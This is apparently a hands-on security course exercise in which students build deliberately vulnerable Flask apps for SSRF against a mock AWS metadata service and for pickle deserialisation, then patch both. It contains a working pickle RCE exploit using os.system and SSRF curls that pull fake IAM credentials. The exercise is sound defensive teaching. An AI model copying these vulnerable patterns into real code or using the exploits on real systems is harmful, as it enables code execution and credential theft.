# Exercise 3 — SSRF and Deserialisation

**Estimated time:** 45 minutes. Python 3.11, Flask, `requests`. Local only.

```
┌─────────────────────────────────────────────────────────────────────┐
│  AUTHORIZED USE ONLY                                                │
│                                                                     │
│  Bind to 127.0.0.1. The vulnerable code is for your own machine.    │
│  Do not deploy any of this to a public service. The SSRF target     │
│  you will hit is a local mock; do not target 169.254.169.254 from   │
│  a cloud VM unless it is your own and you have read the AWS         │
│  acceptable-use policy.                                             │
└─────────────────────────────────────────────────────────────────────┘
```

## Scenario

You are reviewing a small Flask app with two features:

1. **A "URL preview" route** that takes a URL, fetches the page server-side, and returns the first 1 KB of the body.
2. **A "cart restore" route** that accepts a serialised cart from the client and restores it.

The first is vulnerable to **`A10:2021 Server-Side Request Forgery (SSRF)`** (CWE-918). The second is vulnerable to **`A08:2021 Software and Data Integrity Failures`** (CWE-502 Deserialisation of Untrusted Data) because it uses `pickle.loads`.

---

## Step 1 — Set up the local SSRF target (5 min)

You will *simulate* the AWS metadata service locally so the exercise can be done safely. Write `fake_imds.py`:

```python
from flask import Flask

app = Flask(__name__)

@app.route("/latest/meta-data/iam/security-credentials/")
def list_roles():
    return "demo-role"

@app.route("/latest/meta-data/iam/security-credentials/demo-role")
def get_credentials():
    # This is the kind of payload that AWS IMDSv1 returns to *any* requester
    # on the instance. The point of the exercise: SSRF turns "we let the
    # server fetch a URL" into "the server hands the attacker IAM credentials."
    return (
        '{"AccessKeyId":"AKIAEXAMPLEEXAMPLEEX","SecretAccessKey":"FAKE-DO-NOT-USE",'
        '"Token":"FAKE-SESSION-TOKEN","Expiration":"2025-12-31T23:59:59Z"}'
    )

if __name__ == "__main__":
    # Pretend to be 169.254.169.254 by binding a high port on localhost.
    app.run(host="127.0.0.1", port=8169, debug=False)
```

Run it in one terminal:

```bash
python fake_imds.py
```

Verify:

```bash
curl http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/demo-role
```

---

## Step 2 — The vulnerable URL-preview app (10 min)

In a second terminal, write `ssrf_bad.py`:

```python
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route("/preview")
def preview():
    url = request.args.get("url", "")
    if not url:
        return ("missing url", 400)
    # VULNERABLE — A10 SSRF. No validation. The server fetches whatever the user asks.
    try:
        r = requests.get(url, timeout=5)
    except requests.RequestException as e:
        return (f"fetch failed: {e}", 502)
    return r.text[:1024]

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5003, debug=False)
```

Run: `python ssrf_bad.py`.

Exfiltrate the "metadata" via SSRF:

```bash
# Normal use: fetch a public-ish URL (also local for this exercise to keep things offline)
curl "http://127.0.0.1:5003/preview?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/"

# Now exfiltrate the credentials
curl "http://127.0.0.1:5003/preview?url=http://127.0.0.1:8169/latest/meta-data/iam/security-credentials/demo-role"
```

The second request returns the credentials JSON. In a real cloud deployment, this is the canonical SSRF impact: leak IAM credentials, then use them from anywhere on the internet for as long as they remain valid. **Capture the output.**

---

## Step 3 — Patch the SSRF (15 min)

Write `ssrf_good.py`. Stack the defences from Lecture 3 §3.3:

```python
import ipaddress
import socket
from urllib.parse import urlparse
import requests
from flask import Flask, request

app = Flask(__name__)

ALLOWED_SCHEMES = {"http", "https"}
ALLOWED_PORTS = {80, 443}

def resolve_safe(hostname: str, port: int) -> str | None:
    """Resolve hostname; return the first public IP if all addresses are public, else None."""
    try:
        infos = socket.getaddrinfo(hostname, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror:
        return None
    safe_ip = None
    for family, _, _, _, sockaddr in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        # Reject if any resolved IP is local / private / reserved.
        if (ip.is_private or ip.is_loopback or ip.is_link_local
                or ip.is_reserved or ip.is_multicast or ip.is_unspecified):
            return None
        # Explicit IMDS block.
        if str(ip) in {"169.254.169.254", "fd00:ec2::254"}:
            return None
        if safe_ip is None:
            safe_ip = str(ip)
    return safe_ip

@app.route("/preview")
def preview():
    url = request.args.get("url", "")
    if not url:
        return ("missing url", 400)
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return ("bad scheme", 400)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    if port not in ALLOWED_PORTS:
        return ("bad port", 400)
    if not parsed.hostname:
        return ("bad host", 400)
    safe_ip = resolve_safe(parsed.hostname, port)
    if safe_ip is None:
        return ("host not allowed", 400)
    # Issue the request with redirects disabled — a 302 to a private IP bypasses the pre-check.
    try:
        r = requests.get(url, timeout=5, allow_redirects=False)
    except requests.RequestException as e:
        return (f"fetch failed: {e}", 502)
    if r.status_code >= 300 and r.status_code < 400:
        return ("redirect refused", 400)
    return r.text[:1024]

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5003, debug=False)
```

Note the trade-offs in this fix:

- **For the exercise**, `resolve_safe` rejects every loopback IP — which means the fake-IMDS server on `127.0.0.1:8169` is rejected. That is the correct behaviour: SSRF defence rejects loopback for the *application* even when the *exercise* runs on loopback. Verify by curling the patched route and seeing `400 host not allowed`.
- **In production**, you would also enforce an *egress firewall* (`nftables` or cloud security group) so that even if the application's defence is bypassed, the network cannot reach `169.254.169.254`.
- **DNS rebinding defence** would re-resolve at fetch time *and pass the resolved IP* with a `Host:` header, ensuring the URL the validator saw is the URL the request actually reaches. The version above does not do this; it would for a real production service. Document this in the write-up as a known residual.

Re-run the attack curls. Both should return `400`.

---

## Step 4 — The vulnerable cart restore (5 min)

Write `pickle_bad.py`:

```python
import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/cart/restore", methods=["POST"])
def restore_cart():
    blob = request.get_data()
    # VULNERABLE — A08 Software and Data Integrity Failures (CWE-502).
    # pickle.loads on untrusted bytes is RCE.
    cart = pickle.loads(blob)
    return f"loaded {len(cart)} items"

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5004, debug=False)
```

Run: `python pickle_bad.py`.

Write the exploit, `pickle_exploit.py`:

```python
import os
import pickle
import requests

class Exploit:
    def __reduce__(self):
        # In a real attack, this would be RCE. For the exercise, we just
        # touch a file — but the mechanism is the same.
        return (os.system, ("touch /tmp/c6_week4_pickle_pwn",))

payload = pickle.dumps(Exploit())
r = requests.post("http://127.0.0.1:5004/cart/restore", data=payload)
print(r.status_code, r.text)
print("check: ls -la /tmp/c6_week4_pickle_pwn")
```

Run it:

```bash
python pickle_exploit.py
ls -la /tmp/c6_week4_pickle_pwn
```

The file exists. The pickle stream caused the server to call `os.system("touch /tmp/c6_week4_pickle_pwn")`. With a richer payload, the same mechanism reads `/etc/passwd`, opens a reverse shell, or installs persistence. **Clean up:** `rm /tmp/c6_week4_pickle_pwn`.

---

## Step 5 — Patch the deserialisation (5 min)

Write `pickle_good.py`:

```python
import json
from flask import Flask, request

app = Flask(__name__)

@app.route("/cart/restore", methods=["POST"])
def restore_cart():
    try:
        cart = json.loads(request.get_data())
    except json.JSONDecodeError:
        return ("bad json", 400)
    # Schema validation — pydantic or marshmallow would be cleaner; this is the principle.
    if not isinstance(cart, list):
        return ("bad schema", 400)
    for item in cart:
        if not isinstance(item, dict):
            return ("bad schema", 400)
        if not isinstance(item.get("sku"), str):
            return ("bad schema", 400)
        if not isinstance(item.get("qty"), int):
            return ("bad schema", 400)
        if item["qty"] < 1 or item["qty"] > 100:
            return ("bad qty", 400)
    return f"loaded {len(cart)} items"

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5004, debug=False)
```

Re-run the pickle exploit against the patched server:

```bash
python pickle_exploit.py
# 400 bad json — the pickle bytes are not valid JSON.
ls -la /tmp/c6_week4_pickle_pwn
# No such file. Good.
```

The rule: **never `pickle.loads` data you did not `pickle.dumps` yourself, in the same process, in the same trust boundary**. Across a trust boundary, use JSON (or msgpack, or protobuf) with a validated schema.

---

## Step 6 — Static analysis and write up (5 min)

```bash
bandit ssrf_bad.py pickle_bad.py
semgrep --config p/owasp-top-ten ssrf_bad.py pickle_bad.py
```

`bandit` catches `pickle.loads` immediately (`B301`). The SSRF is harder for static analysis — note in the write-up which tool catches it and which does not.

Write `writeup.md` covering A10 and A08 with categories (OWASP IDs + CWE IDs), bug, fix, detection, residual risk.

---

## Acceptance criteria

- [ ] `fake_imds.py` serves the mock metadata locally on `127.0.0.1:8169`.
- [ ] `ssrf_bad.py` runs; the SSRF attack curl returns the credentials JSON.
- [ ] `ssrf_good.py` runs; the same attack curl returns `400`.
- [ ] `pickle_bad.py` runs; `pickle_exploit.py` creates `/tmp/c6_week4_pickle_pwn`.
- [ ] `pickle_good.py` runs; the same exploit returns `400` and creates nothing.
- [ ] `writeup.md` covers categories, bug, fix, detection, residual risk for both A10 and A08.
- [ ] No code is bound to anything other than `127.0.0.1`.
- [ ] `/tmp/c6_week4_pickle_pwn` cleaned up after the exercise.

## Why this exercise

SSRF is the modern vulnerability — cloud-shaped, often invisible in static analysis, and the impact ("we leaked our IAM credentials") is the worst kind of incident. The defence is stacked because the bypasses are many; understanding the *stack* (allow-list scheme, allow-list port, IP-range check, redirect-off, egress firewall, IMDSv2) is the lesson. Deserialisation is the older lesson — `pickle.loads` is a known foot-gun and the Python community has been saying "do not do this" since at least 2008 — and yet the pattern recurs because pickle is convenient and JSON-plus-schema is a few extra lines. Pay the extra lines.
